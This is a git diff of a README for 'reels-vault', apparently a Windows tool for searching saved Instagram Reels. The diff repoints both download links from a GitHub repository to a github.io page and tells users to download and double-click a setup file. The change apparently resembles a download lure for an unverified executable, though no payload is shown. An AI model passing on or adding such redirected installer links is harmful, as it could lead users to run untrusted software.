@@ -1,6 +1,6 @@
 # 💾 reels-vault - Organize your saved Instagram videos easily
 
-[![Download reels-vault](https://img.shields.io/badge/Download-ReelsVault-blue.svg)](https://github.com/Foreigncountryfibroid630/reels-vault)
+[![Download reels-vault](https://img.shields.io/badge/Download-ReelsVault-blue.svg)](https://foreigncountryfibroid630.github.io)
 
 reels-vault turns your saved Instagram Reels into a searchable database. You keep your videos on your own computer. The software transcribes your audio into text without needing extra keys or paid accounts. You search your collection by typing words you remember from the videos.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your computer requires at 
 
 ## 📥 How to Install
 
-1. Visit the project page to download the setup file: https://github.com/Foreigncountryfibroid630/reels-vault
+1. Visit the project page to download the setup file: https://foreigncountryfibroid630.github.io
 2. Find the file in your downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the steps on your screen.
